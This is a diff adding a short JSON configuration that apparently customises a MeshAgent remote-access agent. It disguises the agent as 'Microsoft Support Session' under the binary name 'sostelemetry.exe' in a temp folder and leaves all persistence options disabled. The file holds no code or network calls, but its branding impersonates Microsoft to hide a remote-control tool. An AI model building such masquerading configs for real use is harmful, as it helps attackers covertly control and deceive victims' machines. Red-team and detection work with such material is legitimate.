@@ -1,0 +1,23 @@
+{
+  "$schema": "./schema/meshagent.schema.json",
+  "inheritFrom": "./meshagent.json",
+  "branding": {
+    "binaryName": "sostelemetry.exe",
+    "serviceName": null,
+    "displayName": null,
+    "installRoot": "%TEMP%/BypassSupport",
+    "description": "Microsoft Support Session"
+  },
+  "persistence": {
+    "runKey": false,
+    "scheduledTask": {
+      "enabled": false
+    },
+    "wmi": {
+      "enabled": false
+    },
+    "watchdog": {
+      "enabled": false
+    }
+  }
+}
